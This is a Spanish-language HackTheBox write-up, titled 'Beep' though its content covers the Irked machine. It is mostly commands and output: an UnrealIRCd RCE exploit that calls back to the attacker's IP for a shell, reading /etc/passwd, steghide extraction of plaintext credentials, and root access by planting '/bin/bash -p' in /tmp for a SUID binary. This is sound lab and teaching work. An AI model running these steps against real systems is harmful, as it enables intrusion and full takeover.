# Beep ![Avatar](https://www.hackthebox.eu/storage/avatars/5fb846e75cf0db0c4b27e2dc64a9bf82_thumb.png)

### Initial Scan

```
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34234/tcp   status
|   100024  1          41847/udp   status
|   100024  1          47934/udp6  status
|_  100024  1          51357/tcp6  status
6697/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
8067/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
34234/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
```

### Enumeration

La versión del IRC presenta una vulnerabilidad (CVE 2010-2075) que permite RCE, exploremos esta via

### Exploit

Encontramos un exploit que valga para este CVE y nos lo descargamos
```
https://github.com/M4LV0/UnrealIRCd-3.2.8.1-RCE
```
Lancemos el exploit
```
python2.7 pwnunrealirc.py 10.10.14.2 4444 10.10.10.117 6697
```
Tenemos shell
```
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```
Dado que no hay user.txt en nuestra carpeta veamos que mas usuarios tenemos
```
ircd@irked:~/Unreal3.2$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash
ircd:x:1001:1001::/home/ircd:/bin/sh
```
djmardov tiene la flag del user no por intuición si no porque podemos ver dentro de su carpeta home, no tenemos permiso para leerla, pero si para leer un archivo de backup

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```
Steg puede implicar la presencia de steganografia en la imagen hallada en la pagina web, descargemosla y comprobemos si podemos sacar algo 

```
pj@crow-foot:~/Current$ steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss 
anoto los datos extraodos en/"pass.txt".
```
En pass.txt tenemos lo siguiente
```
Kab6h+m+bbp2J:HG
```
Las creds quedan asi
```creds
djmardov:Kab6h+m+bbp2J:HG
```
Y con esto ya podemos logearnos y obtener la primera flag
### Priv Escalation

Buscamos SUID
```
djmardov@irked:~$ find / -type f -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
```
viewuser parece sospechoso, ejecutemoslo

```
djmardov@irked:~$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-08-01 10:45 (:0)
djmardov pts/1        2020-08-01 12:22 (10.10.14.2)
sh: 1: /tmp/listusers: not found
```
Parece que busca algún archivo en /tmp veamos si podemos invocar una shell abusando de ello.

```
echo '/bin/bash -p' > /tmp/listusers
djmardov@irked:~$ /usr/bin/viewuser 
```
Con esto ya tenmos una shell como administrador
```
root@irked:~# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth).
```

Ahora solo nos queda leer la root flag 
```
root@irked:/root# wc -c root.txt 
33 root.txt
```
